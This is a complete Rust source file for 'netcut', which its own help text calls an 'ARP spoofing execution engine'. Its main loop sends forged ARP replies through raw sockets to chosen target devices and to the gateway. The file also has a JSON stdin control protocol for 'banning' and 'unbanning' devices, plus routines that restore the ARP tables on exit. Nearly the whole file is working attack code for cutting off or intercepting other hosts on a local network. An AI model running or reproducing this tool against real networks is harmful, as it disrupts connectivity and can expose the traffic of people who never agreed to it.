use anyhow::{Context, Result, anyhow};
use clap::Parser;
use serde::{Deserialize, Serialize};
use signal_hook::consts::{SIGINT, SIGTERM};
use signal_hook::iterator::Signals;
use std::collections::HashMap;
use std::io::Write;
use std::mem::{size_of, zeroed};
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{mpsc, Arc, RwLock};
use std::thread;
use std::time::{Duration, Instant};

// ============================================================================
// UTILITIES: Structured Logging
// ============================================================================
macro_rules! log_info {
    ($($arg:tt)*) => {
        eprintln!("[INFO] {}", format_args!($($arg)*));
    };
}
macro_rules! log_error {
    ($($arg:tt)*) => {
        eprintln!("[ERROR] {}", format_args!($($arg)*));
    };
}

// ============================================================================
// MODULE: protocol
// ============================================================================
mod protocol {
    use super::*;

    pub const VERSION: u8 = 1;

    #[derive(Debug, Deserialize)]
    pub struct JsonRequest {
        pub protocol: u8,
        pub id: u64,
        #[serde(flatten)]
        pub command: Command,
    }

    #[derive(Debug, Deserialize)]
    pub struct TargetSync {
        pub ip: String,
        pub mac: String,
    }

    #[derive(Debug, Deserialize)]
    #[serde(rename_all = "snake_case", tag = "command")]
    pub enum Command {
        Ban { ip: String, mac: Option<String> },
        Unban { mac: String },
        Sync { targets: Vec<TargetSync> },
        Ping,
        Stats,
        Flush,
        List,
        Quit,
    }

    #[derive(Debug, Serialize)]
    #[serde(rename_all = "SCREAMING_SNAKE_CASE")]
    pub enum Event {
        ServiceStarted,
        ServiceStopped,
        PoisoningStarted,
        PoisoningStopped,
        RestoreStarted,
        RestoreCompleted,
        TargetAdded,
        TargetRemoved,
        TargetList,
        SyncCompleted,
        Success,
        Error,
        Pong,
        Stats,
    }

    #[derive(Debug, Serialize)]
    pub struct JsonResponse {
        pub protocol: u8,
        pub id: u64,
        pub event: Event,
        #[serde(skip_serializing_if = "Option::is_none")]
        pub code: Option<String>,
        #[serde(skip_serializing_if = "Option::is_none")]
        pub ip: Option<String>,
        #[serde(skip_serializing_if = "Option::is_none")]
        pub message: Option<String>,
        #[serde(skip_serializing_if = "Option::is_none")]
        pub targets: Option<Vec<TargetJson>>,
        #[serde(skip_serializing_if = "Option::is_none")]
        pub data: Option<serde_json::Value>,
    }

    #[derive(Debug, Serialize)]
    pub struct TargetJson {
        pub ip: String,
        pub mac: String,
    }

    pub fn send_response(
        id: u64,
        event: Event,
        code: Option<&str>,
        ip: Option<&str>,
        message: Option<&str>,
        targets: Option<Vec<TargetJson>>,
        data: Option<serde_json::Value>,
    ) {
        let resp = JsonResponse {
            protocol: VERSION,
            id,
            event,
            code: code.map(|s| s.to_string()),
            ip: ip.map(|s| s.to_string()),
            message: message.map(|s| s.to_string()),
            targets,
            data,
        };
        println!("{}", serde_json::to_string(&resp).unwrap());
        let _ = std::io::stdout().flush();
    }
}

// ============================================================================
// MODULE: arp
// ============================================================================
mod arp {
    use super::*;

    #[repr(C, packed)]
    #[derive(Clone, Copy)]
    pub struct ArpFrame {
        pub eth_dst: [u8; 6],
        pub eth_src: [u8; 6],
        pub eth_type: u16,
        pub htype: u16,
        pub ptype: u16,
        pub hlen: u8,
        pub plen: u8,
        pub oper: u16,
        pub sha: [u8; 6],
        pub spa: [u8; 4],
        pub tha: [u8; 6],
        pub tpa: [u8; 4],
    }

    impl ArpFrame {
        pub fn as_bytes(&self) -> &[u8] {
            unsafe { std::slice::from_raw_parts((self as *const ArpFrame) as *const u8, size_of::<ArpFrame>()) }
        }
    }

    pub fn build_arp_reply(src_mac: [u8; 6], dst_mac: [u8; 6], spoofed_ip: Ipv4Addr, target_ip: Ipv4Addr) -> ArpFrame {
        ArpFrame {
            eth_dst: dst_mac,
            eth_src: src_mac,
            eth_type: 0x0806u16.to_be(),
            htype: 1u16.to_be(),
            ptype: 0x0800u16.to_be(),
            hlen: 6,
            plen: 4,
            oper: 2u16.to_be(),
            sha: src_mac,
            spa: spoofed_ip.octets(),
            tha: dst_mac,
            tpa: target_ip.octets(),
        }
    }

    pub fn build_arp_reply_restore(tx_mac: [u8; 6], dst_mac: [u8; 6], real_sender_mac: [u8; 6], sender_ip: Ipv4Addr, target_ip: Ipv4Addr) -> ArpFrame {
        ArpFrame {
            eth_dst: dst_mac,
            eth_src: tx_mac,
            eth_type: 0x0806u16.to_be(),
            htype: 1u16.to_be(),
            ptype: 0x0800u16.to_be(),
            hlen: 6,
            plen: 4,
            oper: 2u16.to_be(),
            sha: real_sender_mac,
            spa: sender_ip.octets(),
            tha: dst_mac,
            tpa: target_ip.octets(),
        }
    }

    pub fn build_arp_request(src_mac: [u8; 6], sender_ip: Ipv4Addr, target_ip: Ipv4Addr) -> ArpFrame {
        ArpFrame {
            eth_dst: [0xff; 6],
            eth_src: src_mac,
            eth_type: 0x0806u16.to_be(),
            htype: 1u16.to_be(),
            ptype: 0x0800u16.to_be(),
            hlen: 6,
            plen: 4,
            oper: 1u16.to_be(),
            sha: src_mac,
            spa: sender_ip.octets(),
            tha: [0; 6],
            tpa: target_ip.octets(),
        }
    }

    pub fn build_gratuitous_arp(mac: [u8; 6], ip: Ipv4Addr) -> ArpFrame {
        ArpFrame {
            eth_dst: [0xff; 6],
            eth_src: mac,
            eth_type: 0x0806u16.to_be(),
            htype: 1u16.to_be(),
            ptype: 0x0800u16.to_be(),
            hlen: 6,
            plen: 4,
            oper: 2u16.to_be(),
            sha: mac,
            spa: ip.octets(),
            tha: [0x00; 6],
            tpa: ip.octets(),
        }
    }
}

// ============================================================================
// MODULE: raw_socket
// ============================================================================
mod raw_socket {
    use super::*;
    use libc::{AF_PACKET, ETH_ALEN, ETH_P_ARP, IFNAMSIZ, SIOCGIFADDR, SIOCGIFHWADDR, SO_BINDTODEVICE,
               SOCK_RAW, SOL_SOCKET, c_int, c_void, close, if_nametoindex, ioctl, sendto, setsockopt,
               sockaddr, sockaddr_ll, socket, socklen_t};

    #[cfg(target_env = "gnu")]
    type IoctlReq = libc::c_ulong;
    #[cfg(not(target_env = "gnu"))]
    type IoctlReq = libc::c_int;

    #[repr(C)]
    union IfrIfru {
        ifru_addr: sockaddr,
        ifru_hwaddr: sockaddr,
        ifru_flags: libc::c_short,
        ifru_ivalue: libc::c_int,
        ifru_mtu: libc::c_int,
        ifru_data: *mut c_void,
        _pad: [u8; 24],
    }

    #[repr(C)]
    struct Ifreq {
        ifr_name: [libc::c_char; IFNAMSIZ],
        ifr_ifru: IfrIfru,
    }

    impl Ifreq {
        fn new(iface: &str) -> Result<Self> {
            if iface.len() >= IFNAMSIZ {
                return Err(anyhow!("interface name too long"));
            }
            let mut req: Ifreq = unsafe { zeroed() };
            for (i, b) in iface.as_bytes().iter().enumerate() {
                req.ifr_name[i] = *b as libc::c_char;
            }
            Ok(Self { ifr_name: req.ifr_name, ifr_ifru: req.ifr_ifru })
        }
    }

    pub struct RawSock {
        pub fd: c_int,
    }

    impl RawSock {
        pub fn new(protocol: u16) -> Result<Self> {
            let proto = i32::from(protocol.to_be());
            let fd = unsafe { socket(AF_PACKET, SOCK_RAW, proto) };
            if fd < 0 {
                let err = std::io::Error::last_os_error();
                if err.raw_os_error() == Some(libc::EPERM) {
                    return Err(anyhow!("Permission denied to create raw socket"));
                }
                return Err(err).context("socket(AF_PACKET, SOCK_RAW)");
            }
            Ok(Self { fd })
        }

        pub fn bind_to_device(&self, iface: &str) -> Result<()> {
            let bytes = iface.as_bytes();
            let rc = unsafe {
                setsockopt(
                    self.fd,
                    SOL_SOCKET,
                    SO_BINDTODEVICE,
                    bytes.as_ptr() as *const c_void,
                    bytes.len() as socklen_t,
                )
            };
            if rc < 0 {
                let err = std::io::Error::last_os_error();
                if err.raw_os_error() == Some(libc::EPERM) {
                    return Err(anyhow!("Permission denied to bind to device"));
                }
                return Err(err).context("SO_BINDTODEVICE");
            }
            Ok(())
        }

        pub fn send_frame(&self, frame: &[u8], ifindex: i32) -> Result<()> {
            let mut sll: sockaddr_ll = unsafe { zeroed() };
            sll.sll_family = AF_PACKET as u16;
            sll.sll_protocol = (ETH_P_ARP as u16).to_be();
            sll.sll_ifindex = ifindex;
            sll.sll_halen = ETH_ALEN as u8;
            sll.sll_addr[..6].copy_from_slice(&frame[0..6]);

            let sent = unsafe {
                sendto(
                    self.fd,
                    frame.as_ptr() as *const c_void,
                    frame.len(),
                    0,
                    &sll as *const sockaddr_ll as *const sockaddr,
                    size_of::<sockaddr_ll>() as socklen_t,
                )
            };
            if sent < 0 {
                return Err(std::io::Error::last_os_error()).context("sendto");
            }
            Ok(())
        }
    }

    impl Drop for RawSock {
        fn drop(&mut self) {
            unsafe { close(self.fd) };
        }
    }

    pub fn get_iface_mac(iface: &str) -> Result<[u8; 6]> {
        let fd = unsafe { socket(libc::AF_INET, libc::SOCK_DGRAM, 0) };
        if fd < 0 {
            return Err(std::io::Error::last_os_error()).context("socket(AF_INET) for ioctl");
        }
        let mut req = Ifreq::new(iface)?;
        let rc = unsafe { ioctl(fd, SIOCGIFHWADDR as IoctlReq, &mut req as *mut _) };
        let err = std::io::Error::last_os_error();
        unsafe { close(fd) };
        if rc < 0 {
            if err.raw_os_error() == Some(libc::ENODEV) {
                return Err(anyhow!("Interface {} not found", iface));
            }
            return Err(err).context("SIOCGIFHWADDR");
        }
        let sa = unsafe { &req.ifr_ifru.ifru_hwaddr };
        let mut mac = [0u8; 6];
        for i in 0..6 {
            mac[i] = sa.sa_data[i] as u8;
        }
        Ok(mac)
    }

    pub fn get_iface_ipv4(iface: &str) -> Result<Ipv4Addr> {
        let fd = unsafe { socket(libc::AF_INET, libc::SOCK_DGRAM, 0) };
        if fd < 0 {
            return Err(std::io::Error::last_os_error()).context("socket(AF_INET) for ioctl");
        }
        let mut req = Ifreq::new(iface)?;
        let rc = unsafe { ioctl(fd, SIOCGIFADDR as IoctlReq, &mut req as *mut _) };
        let err = std::io::Error::last_os_error();
        unsafe { close(fd) };
        if rc < 0 {
            if err.raw_os_error() == Some(libc::ENODEV) {
                return Err(anyhow!("Interface {} not found", iface));
            }
            return Err(err).context("SIOCGIFADDR");
        }
        let sa = unsafe { &req.ifr_ifru.ifru_addr };
        Ok(Ipv4Addr::new(
            sa.sa_data[2] as u8,
            sa.sa_data[3] as u8,
            sa.sa_data[4] as u8,
            sa.sa_data[5] as u8,
        ))
    }

    pub fn get_iface_index(iface: &str) -> Result<i32> {
        let cname = std::ffi::CString::new(iface).context("iface name has NUL")?;
        let idx = unsafe { if_nametoindex(cname.as_ptr()) };
        if idx == 0 {
            let err = std::io::Error::last_os_error();
            if err.raw_os_error() == Some(libc::ENODEV) {
                return Err(anyhow!("Interface {} not found", iface));
            }
            return Err(err).context("if_nametoindex");
        }
        Ok(idx as i32)
    }
}

// ============================================================================
// MODULE: engine
// ============================================================================
mod engine {
    use super::*;
    use crate::arp::{build_arp_reply_restore, build_arp_request, build_gratuitous_arp, ArpFrame};
    use crate::raw_socket::RawSock;
    use std::net::Ipv4Addr;
    use std::sync::atomic::{AtomicBool, Ordering};

    pub struct TargetInfo {
        pub ip: Ipv4Addr,
        pub mac: [u8; 6],
    }

    pub struct EngineStats {
        pub start_time: Instant,
        pub packets_sent: Arc<AtomicU64>,
    }

    pub fn format_mac(m: &[u8; 6]) -> String {
        format!("{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}", m[0], m[1], m[2], m[3], m[4], m[5])
    }

    pub fn parse_mac(s: &str) -> Option<[u8; 6]> {
        let s = s.replace('-', ":").to_uppercase();
        let parts: Vec<&str> = s.split(':').collect();
        if parts.len() != 6 {
            return None;
        }
        let mut mac = [0u8; 6];
        for (i, part) in parts.iter().enumerate() {
            if let Ok(val) = u8::from_str_radix(part, 16) {
                mac[i] = val;
            } else {
                return None;
            }
        }
        Some(mac)
    }

    pub fn resolve_mac(
        iface: &str,
        our_mac: [u8; 6],
        our_ip: Ipv4Addr,
        target_ip: Ipv4Addr,
        ifindex: i32,
        timeout: Duration,
        stop: &Arc<AtomicBool>,
    ) -> Result<[u8; 6]> {
        let resolver = RawSock::new(libc::ETH_P_ARP as u16)?;
        resolver.bind_to_device(iface)?;

        let tv = libc::timeval { tv_sec: 0, tv_usec: 250_000 };
        unsafe {
            libc::setsockopt(
                resolver.fd,
                libc::SOL_SOCKET,
                libc::SO_RCVTIMEO,
                &tv as *const _ as *const libc::c_void,
                std::mem::size_of::<libc::timeval>() as libc::socklen_t,
            );
        }

        let req = build_arp_request(our_mac, our_ip, target_ip);
        let deadline = Instant::now() + timeout;
        let mut last_send = Instant::now() - Duration::from_secs(60);
        let mut buf = [0u8; 1500];

        while Instant::now() < deadline && !stop.load(Ordering::Relaxed) {
            if last_send.elapsed() >= Duration::from_millis(500) {
                let _ = resolver.send_frame(req.as_bytes(), ifindex);
                last_send = Instant::now();
            }

            let n = unsafe { libc::recv(resolver.fd, buf.as_mut_ptr() as *mut libc::c_void, buf.len(), 0) };
            if n < 0 {
                let e = std::io::Error::last_os_error();
                if let Some(code) = e.raw_os_error() {
                    if code == libc::EAGAIN || code == libc::EWOULDBLOCK || code == libc::EINTR {
                        continue;
                    }
                }
                return Err(anyhow!("recv error while resolving MAC"));
            }
            let n = n as usize;
            if n < std::mem::size_of::<ArpFrame>() {
                continue;
            }
            let eth_type = u16::from_be_bytes([buf[12], buf[13]]);
            if eth_type != 0x0806 {
                continue;
            }
            let oper = u16::from_be_bytes([buf[20], buf[21]]);
            if oper != 2 {
                continue;
            }
            let spa = Ipv4Addr::new(buf[28], buf[29], buf[30], buf[31]);
            if spa != target_ip {
                continue;
            }
            let mut mac = [0u8; 6];
            mac.copy_from_slice(&buf[22..28]);
            return Ok(mac);
        }
        Err(anyhow!("Timed out resolving MAC"))
    }

    pub fn aggressive_restore(
        sock: &RawSock,
        ifindex: i32,
        targets: &[(Ipv4Addr, [u8; 6])],
        gateway_ip: Ipv4Addr,
        gateway_mac: [u8; 6],
        our_mac: [u8; 6],
        our_ip: Ipv4Addr,
    ) {
        for (ip, mac) in targets {
            let restore_target = build_arp_reply_restore(our_mac, *mac, gateway_mac, gateway_ip, *ip);
            let restore_gateway = build_arp_reply_restore(our_mac, gateway_mac, *mac, *ip, gateway_ip);
            for _ in 0..5 {
                let _ = sock.send_frame(restore_target.as_bytes(), ifindex);
                let _ = sock.send_frame(restore_gateway.as_bytes(), ifindex);
                thread::sleep(Duration::from_millis(20));
            }
        }
        
        let gratuitous_ourself = build_gratuitous_arp(our_mac, our_ip);
        for _ in 0..3 {
            let _ = sock.send_frame(gratuitous_ourself.as_bytes(), ifindex);
            thread::sleep(Duration::from_millis(20));
        }
    }
}

// ============================================================================
// MODULE: main
// ============================================================================
fn main() -> Result<()> {
    use crate::engine::{aggressive_restore, format_mac, parse_mac, resolve_mac, EngineStats, TargetInfo};
    use crate::protocol::{send_response, Command, Event, JsonRequest, VERSION};
    use crate::raw_socket::{get_iface_index, get_iface_ipv4, get_iface_mac, RawSock};

    unsafe { libc::signal(libc::SIGPIPE, libc::SIG_IGN); }

    #[derive(Parser, Debug)]
    #[command(name = "netcut", about = "ARP spoofing execution engine")]
    struct Args {
        #[arg(help = "Network interface (e.g., wlan0, eth0)")]
        iface: String,
        #[arg(help = "Gateway IP address")]
        gateway: Ipv4Addr,
        #[arg(long, default_value_t = 10, help = "Packets per second per target (1-100)")]
        rate: u64,
    }

    let args = Args::parse();
    
    let targets: Arc<RwLock<HashMap<[u8; 6], TargetInfo>>> = Arc::new(RwLock::new(HashMap::new()));
    let running = Arc::new(AtomicBool::new(true));
    let stop = Arc::new(AtomicBool::new(false));
    
    let stats = Arc::new(EngineStats {
        start_time: Instant::now(),
        packets_sent: Arc::new(AtomicU64::new(0)),
    });

    let ifindex = match get_iface_index(&args.iface) {
        Ok(idx) => idx,
        Err(e) => {
            log_error!("module=main event=interface_error msg={}", e);
            send_response(0, Event::Error, Some("INTERFACE_NOT_FOUND"), None, Some(&e.to_string()), None, None);
            std::process::exit(1);
        }
    };

    let src_mac = match get_iface_mac(&args.iface) {
        Ok(mac) => mac,
        Err(e) => {
            log_error!("module=main event=mac_error msg={}", e);
            send_response(0, Event::Error, Some("INTERFACE_ERROR"), None, Some(&e.to_string()), None, None);
            std::process::exit(1);
        }
    };

    let src_ip = match get_iface_ipv4(&args.iface) {
        Ok(ip) => ip,
        Err(e) => {
            log_error!("module=main event=ip_error msg={}", e);
            send_response(0, Event::Error, Some("INTERFACE_ERROR"), None, Some(&e.to_string()), None, None);
            std::process::exit(1);
        }
    };

    let gateway_mac = match resolve_mac(
        &args.iface, src_mac, src_ip, args.gateway, ifindex, Duration::from_secs(5), &stop,
    ) {
        Ok(mac) => mac,
        Err(e) => {
            log_error!("module=main event=gateway_unreachable msg={}", e);
            send_response(0, Event::Error, Some("GATEWAY_UNREACHABLE"), None, Some(&e.to_string()), None, None);
            std::process::exit(1);
        }
    };

    {
        let running = running.clone();
        let stop = stop.clone();
        let mut signals = match Signals::new(&[SIGINT, SIGTERM]) {
            Ok(s) => s,
            Err(_) => {
                send_response(0, Event::Error, Some("SIGNAL_HANDLER_FAILED"), None, Some("Failed to setup signal handler"), None, None);
                std::process::exit(1);
            }
        };
        thread::spawn(move || {
            for _ in signals.forever() {
                log_info!("module=main event=signal_received");
                running.store(false, Ordering::SeqCst);
                stop.store(true, Ordering::Release);
                break;
            }
        });
    }

    let (cmd_tx, cmd_rx) = mpsc::channel::<JsonRequest>();

    let running_clone_rx = Arc::clone(&running);
    thread::spawn(move || {
        let stdin = std::io::stdin();
        let mut input = String::new();
        while running_clone_rx.load(Ordering::SeqCst) {
            input.clear();
            match stdin.read_line(&mut input) {
                Ok(0) | Err(_) => {
                    log_info!("module=stdin event=eof_or_error");
                    running_clone_rx.store(false, Ordering::SeqCst);
                    break;
                }
                Ok(_) => {
                    if input.trim().is_empty() { continue; }
                }
            }

            match serde_json::from_str::<JsonRequest>(input.trim()) {
                Ok(req) => {
                    let _ = cmd_tx.send(req);
                }
                Err(_) => {
                    send_response(0, Event::Error, Some("INVALID_JSON"), None, Some("Invalid JSON format"), None, None);
                }
            }
        }
    });

    let targets_clone = Arc::clone(&targets);
    let running_clone_worker = Arc::clone(&running);
    let stop_clone_worker = Arc::clone(&stop);
    let stats_clone_worker = Arc::clone(&stats);
    
    let iface_clone = args.iface.clone();
    let gateway_clone = args.gateway;
    let src_mac_clone = src_mac;
    let src_ip_clone = src_ip;
    let ifindex_clone = ifindex;
    let gateway_mac_clone = gateway_mac;

    thread::spawn(move || {
        let timeout = Duration::from_secs(300);
        
        while running_clone_worker.load(Ordering::SeqCst) {
            match cmd_rx.recv_timeout(timeout) {
                Ok(req) => {
                    if req.protocol != VERSION {
                        send_response(req.id, Event::Error, Some("PROTOCOL_MISMATCH"), None, Some("Protocol version mismatch"), None, None);
                        continue;
                    }

                    match req.command {
                        Command::Ban { ip, mac } => {
                            let ip_addr: Ipv4Addr = match ip.parse() {
                                Ok(i) => i,
                                Err(_) => {
                                    send_response(req.id, Event::Error, Some("INVALID_IP"), Some(&ip), Some("Invalid IP address"), None, None);
                                    continue;
                                }
                            };

                            let target_mac = if let Some(m) = mac {
                                let provided_mac = match parse_mac(&m) {
                                    Some(m) => m,
                                    None => {
                                        send_response(req.id, Event::Error, Some("INVALID_MAC"), Some(&ip), Some("Invalid MAC address"), None, None);
                                        continue;
                                    }
                                };

                                match resolve_mac(&iface_clone, src_mac_clone, src_ip_clone, ip_addr, ifindex_clone, Duration::from_secs(3), &stop_clone_worker) {
                                    Ok(resolved_mac) => {
                                        if resolved_mac != provided_mac {
                                            send_response(req.id, Event::Error, Some("MAC_IP_MISMATCH"), Some(&ip), Some("Provided MAC does not match resolved MAC for this IP"), None, None);
                                            continue;
                                        }
                                        resolved_mac
                                    }
                                    Err(_) => provided_mac,
                                }
                            } else {
                                match resolve_mac(&iface_clone, src_mac_clone, src_ip_clone, ip_addr, ifindex_clone, Duration::from_secs(5), &stop_clone_worker) {
                                    Ok(m) => m,
                                    Err(_) => {
                                        send_response(req.id, Event::Error, Some("MAC_RESOLUTION_FAILED"), Some(&ip), Some("Timed out resolving MAC"), None, None);
                                        continue;
                                    }
                                }
                            };

                            let mut t = targets_clone.write().unwrap();
                            if let Some(info) = t.get_mut(&target_mac) {
                                info.ip = ip_addr;
                                log_info!("module=engine event=target_updated mac={} ip={}", format_mac(&target_mac), ip_addr);
                                send_response(req.id, Event::Success, None, Some(&ip), Some("Target updated"), None, None);
                            } else {
                                t.insert(target_mac, TargetInfo { ip: ip_addr, mac: target_mac });
                                log_info!("module=engine event=target_added mac={} ip={}", format_mac(&target_mac), ip_addr);
                                send_response(req.id, Event::TargetAdded, None, Some(&ip), Some("Target added successfully"), None, None);
                            }
                        }
                        Command::Unban { mac } => {
                            let target_mac = match parse_mac(&mac) {
                                Some(m) => m,
                                None => {
                                    send_response(req.id, Event::Error, Some("INVALID_MAC"), None, Some("Invalid MAC address"), None, None);
                                    continue;
                                }
                            };

                            let ip_opt = {
                                let mut t = targets_clone.write().unwrap();
                                t.remove(&target_mac).map(|info| info.ip)
                            };

                            if let Some(ip) = ip_opt {
                                log_info!("module=engine event=target_removed mac={} ip={}", format_mac(&target_mac), ip);
                                if let Ok(temp_sock) = RawSock::new(libc::ETH_P_ARP as u16) {
                                    let _ = temp_sock.bind_to_device(&iface_clone);
                                    send_response(req.id, Event::RestoreStarted, None, Some(&ip.to_string()), Some("Restoring ARP tables"), None, None);
                                    aggressive_restore(&temp_sock, ifindex_clone, &[(ip, target_mac)], gateway_clone, gateway_mac_clone, src_mac_clone, src_ip_clone);
                                    send_response(req.id, Event::RestoreCompleted, None, Some(&ip.to_string()), Some("Target removed and restored"), None, None);
                                } else {
                                    send_response(req.id, Event::TargetRemoved, None, Some(&ip.to_string()), Some("Target removed (restore socket failed)"), None, None);
                                }
                            } else {
                                send_response(req.id, Event::Error, Some("TARGET_NOT_FOUND"), None, Some("Target MAC not found"), None, None);
                            }
                        }
                        Command::Sync { targets: sync_targets } => {
                            let mut t = targets_clone.write().unwrap();
                            let mut added = 0;
                            let mut updated = 0;
                            
                            let mut to_remove: Vec<[u8; 6]> = t.keys().copied().collect();

                            for target in sync_targets {
                                let ip_addr: Ipv4Addr = match target.ip.parse() {
                                    Ok(i) => i,
                                    Err(_) => continue,
                                };
                                let target_mac = match parse_mac(&target.mac) {
                                    Some(m) => m,
                                    None => continue,
                                };

                                to_remove.retain(|&m| m != target_mac);

                                if let Some(info) = t.get_mut(&target_mac) {
                                    if info.ip != ip_addr {
                                        info.ip = ip_addr;
                                        updated += 1;
                                    }
                                } else {
                                    t.insert(target_mac, TargetInfo { ip: ip_addr, mac: target_mac });
                                    added += 1;
                                }
                            }

                            let mut targets_to_restore = Vec::new();
                            for mac in to_remove {
                                if let Some(info) = t.remove(&mac) {
                                    targets_to_restore.push((info.ip, info.mac));
                                }
                            }
                            
                            drop(t);

                            let removed = targets_to_restore.len();
                            log_info!("module=engine event=sync added={} updated={} removed={}", added, updated, removed);

                            if !targets_to_restore.is_empty() {
                                send_response(req.id, Event::RestoreStarted, None, None, Some(&format!("Restoring {} removed targets", removed)), None, None);
                                if let Ok(temp_sock) = RawSock::new(libc::ETH_P_ARP as u16) {
                                    let _ = temp_sock.bind_to_device(&iface_clone);
                                    aggressive_restore(&temp_sock, ifindex_clone, &targets_to_restore, gateway_clone, gateway_mac_clone, src_mac_clone, src_ip_clone);
                                }
                            }

                            send_response(req.id, Event::SyncCompleted, None, None, Some(&format!("Synced: {} added, {} updated, {} removed", added, updated, removed)), None, None);
                        }
                        Command::Ping => {
                            send_response(req.id, Event::Pong, None, None, Some("pong"), None, None);
                        }
                        Command::Stats => {
                            let t = targets_clone.read().unwrap();
                            let target_count = t.len();
                            let uptime = stats_clone_worker.start_time.elapsed().as_secs();
                            let total_packets = stats_clone_worker.packets_sent.load(Ordering::Relaxed);
                            
                            let data = serde_json::json!({
                                "targets": target_count,
                                "uptime_seconds": uptime,
                                "total_packets_sent": total_packets,
                                "running": running_clone_worker.load(Ordering::SeqCst)
                            });
                            
                            send_response(req.id, Event::Stats, None, None, None, None, Some(data));
                        }
                        Command::Flush => {
                            let targets_to_restore = {
                                let mut t = targets_clone.write().unwrap();
                                let targets: Vec<(Ipv4Addr, [u8; 6])> = t.values().map(|info| (info.ip, info.mac)).collect();
                                t.clear();
                                targets
                            };

                            if targets_to_restore.is_empty() {
                                send_response(req.id, Event::Success, None, None, Some("No targets to flush"), None, None);
                            } else {
                                send_response(req.id, Event::RestoreStarted, None, None, Some(&format!("Restoring {} targets", targets_to_restore.len())), None, None);
                                if let Ok(temp_sock) = RawSock::new(libc::ETH_P_ARP as u16) {
                                    let _ = temp_sock.bind_to_device(&iface_clone);
                                    aggressive_restore(&temp_sock, ifindex_clone, &targets_to_restore, gateway_clone, gateway_mac_clone, src_mac_clone, src_ip_clone);
                                }
                                send_response(req.id, Event::RestoreCompleted, None, None, Some(&format!("Flushed {} targets", targets_to_restore.len())), None, None);
                            }
                        }
                        Command::List => {
                            let t = targets_clone.read().unwrap();
                            let target_list: Vec<crate::protocol::TargetJson> = t.values().map(|info| crate::protocol::TargetJson {
                                ip: info.ip.to_string(),
                                mac: format_mac(&info.mac),
                            }).collect();
                            send_response(req.id, Event::TargetList, None, None, None, Some(target_list), None);
                        }
                        Command::Quit => {
                            log_info!("module=engine event=quit_requested");
                            send_response(req.id, Event::Success, None, None, Some("Shutting down"), None, None);
                            running_clone_worker.store(false, Ordering::SeqCst);
                            stop_clone_worker.store(true, Ordering::Release);
                            break;
                        }
                    }
                }
                Err(mpsc::RecvTimeoutError::Timeout) => {
                    log_info!("module=engine event=inactivity_timeout duration=300s");
                    running_clone_worker.store(false, Ordering::SeqCst);
                    stop_clone_worker.store(true, Ordering::Release);
                    break;
                }
                Err(mpsc::RecvTimeoutError::Disconnected) => {
                    log_info!("module=engine event=command_channel_disconnected");
                    break;
                }
            }
        }
    });

    let rate = args.rate.clamp(1, 100);
    let interval = Duration::from_millis(1000 / rate);
    
    let sock = RawSock::new(libc::ETH_P_ARP as u16)?;
    sock.bind_to_device(&args.iface)?;

    log_info!("module=main event=service_started ip={} mac={}", src_ip, format_mac(&src_mac));
    send_response(0, Event::ServiceStarted, None, Some(&src_ip.to_string()), Some("Service started successfully"), None, None);
    send_response(0, Event::PoisoningStarted, None, None, Some("Poisoning loop active"), None, None);

    // SAFETY MAJOR: Network integrity tracking
    let mut last_integrity_check = Instant::now();
    let integrity_check_interval = Duration::from_secs(2);
    let mut consecutive_failures = 0;
    const MAX_FAILURES: u32 = 5;

    while running.load(Ordering::SeqCst) {
        if stop.load(Ordering::Acquire) { break; }

        // SAFETY MAJOR 1: Network Integrity Check
        if last_integrity_check.elapsed() >= integrity_check_interval {
            if let Ok(current_ip) = get_iface_ipv4(&args.iface) {
                if current_ip != src_ip {
                    log_error!("module=engine event=network_changed old_ip={} new_ip={}", src_ip, current_ip);
                    send_response(0, Event::Error, Some("NETWORK_CHANGED"), None, Some("Interface IP changed, aborting for safety"), None, None);
                    break; // Break to trigger restoration
                }
            } else {
                log_error!("module=engine event=interface_down msg=Cannot read interface IP");
                send_response(0, Event::Error, Some("INTERFACE_DOWN"), None, Some("Interface appears to be down"), None, None);
                break; // Break to trigger restoration
            }
            last_integrity_check = Instant::now();
        }

        let targets_snapshot = {
            let t = targets.read().unwrap();
            t.values().map(|info| (info.ip, info.mac)).collect::<Vec<_>>()
        };

        if targets_snapshot.is_empty() {
            consecutive_failures = 0;
            thread::sleep(Duration::from_secs(1));
            continue;
        }

        let snapshot_len = targets_snapshot.len();
        let mut any_success = false;
        
        for (ip, mac) in targets_snapshot {
            let poison_target = crate::arp::build_arp_reply(src_mac, mac, args.gateway, ip);
            if sock.send_frame(poison_target.as_bytes(), ifindex).is_ok() {
                any_success = true;
            }

            let poison_gateway = crate::arp::build_arp_reply(src_mac, gateway_mac, ip, args.gateway);
            if sock.send_frame(poison_gateway.as_bytes(), ifindex).is_ok() {
                any_success = true;
            }
        }

        if any_success {
            stats.packets_sent.fetch_add(2 * snapshot_len as u64, Ordering::Relaxed);
            consecutive_failures = 0;
        } else {
            consecutive_failures += 1;
            // SAFETY MAJOR 2: Abort on consecutive send failures
            if consecutive_failures >= MAX_FAILURES {
                log_error!("module=engine event=send_failed consecutive_failures={}", consecutive_failures);
                send_response(0, Event::Error, Some("SEND_FAILED"), None, Some("Consecutive send failures, aborting for safety"), None, None);
                break; // Break to trigger restoration
            }
        }

        thread::sleep(interval);
    }

    send_response(0, Event::PoisoningStopped, None, None, Some("Poisoning loop stopped"), None, None);

    let targets_snapshot = {
        let mut t = targets.write().unwrap();
        let targets: Vec<(Ipv4Addr, [u8; 6])> = t.values().map(|info| (info.ip, info.mac)).collect();
        t.clear();
        targets
    };
    
    if !targets_snapshot.is_empty() {
        log_info!("module=main event=restore_started count={}", targets_snapshot.len());
        send_response(0, Event::RestoreStarted, None, None, Some("Restoring ARP tables before exit"), None, None);
        
        // SAFETY MAJOR 3: Use a fresh socket for restoration in case the main one is corrupted
        if let Ok(restore_sock) = RawSock::new(libc::ETH_P_ARP as u16) {
            let _ = restore_sock.bind_to_device(&args.iface);
            aggressive_restore(&restore_sock, ifindex, &targets_snapshot, args.gateway, gateway_mac, src_mac, src_ip);
        } else {
            log_error!("module=main event=restore_failed msg=Could not create restore socket");
        }
        send_response(0, Event::RestoreCompleted, None, None, Some("ARP restoration complete"), None, None);
    }

    log_info!("module=main event=service_stopped");
    send_response(0, Event::ServiceStopped, None, None, Some("Service stopped and ARP restored"), None, None);
    Ok(())
}
